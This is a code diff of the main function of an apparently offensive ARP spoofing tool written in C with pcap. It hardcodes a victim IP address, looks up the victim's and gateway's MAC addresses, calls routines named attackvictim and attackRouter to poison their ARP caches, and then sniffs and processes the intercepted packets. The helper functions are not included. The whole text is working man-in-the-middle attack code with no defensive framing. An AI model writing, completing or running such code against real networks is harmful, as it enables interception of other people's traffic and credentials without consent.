@@ -3,10 +3,10 @@
 int main()
 {
 	LANINFO LanInfo;
-	pcap_if_t* alldevs, * choiceDev;
+	pcap_if_t *alldevs, *choiceDev;
 	pcap_t* handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char victimIP[16] = "192.168.50.135";
+	char victimIP[16] = "192.168.50.146";
 
 	/* Retrieve the device list from the local machine */
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
@@ -27,23 +27,9 @@ int main()
 	memset(&LanInfo, 0, sizeof(LanInfo));
 	/* find Device's GateWay IP address */
 	getGateWayAddress(choiceDev, &LanInfo);
-	/*
-	int res;
-	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0)
-	{
-		if (res == 0)
-			continue;
-		ethernetHeader(packet);
-	}
-	if (res == -1) {
-		printf("Error reading the packets: %s\n", pcap_geterr(handle));
-		return -1;
-	}
-	*/
-	//printf("Input vicim's IP Address : ");
-	//scanf("%s", victimIP);
 	LanInfo.victimIP.S_un.S_addr = inet_addr(victimIP);
 	getMACAddress(handle, &LanInfo);
+	printf("victim MAC : ");
 	for (int i = 0; i < 6; i++)
 	{
 		if (i == 5)
@@ -51,6 +37,7 @@ int main()
 		else
 			printf("%.2X-", LanInfo.victimMAC[i]);
 	}
+	printf("Gateway MAC : ");
 	for (int i = 0; i < 6; i++)
 	{
 		if (i == 5)
@@ -58,7 +45,25 @@ int main()
 		else
 			printf("%.2X-", LanInfo.gatewayMAC[i]);
 	}
-	sendFakeARP(handle, &LanInfo);
+	HEADER TEST_header;
+	setArpHeader(&TEST_header);
+	attackvictim(handle, &TEST_header, &LanInfo);
+	Sleep(500);
+	attackRouter(handle, &TEST_header, &LanInfo);
+	/* sniff packet */
+	int res;
+	struct pcap_pkthdr* header;
+	const u_char* packet;
+	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0)
+	{
+		if (res == 0)
+			continue;
+		checkARP(handle, packet, &LanInfo);
+	}
+	if (res == -1) {
+		printf("Error reading the packets: %s\n", pcap_geterr(handle));
+		return -1;
+	}
 	pcap_close(handle);
 	return 0;
 }
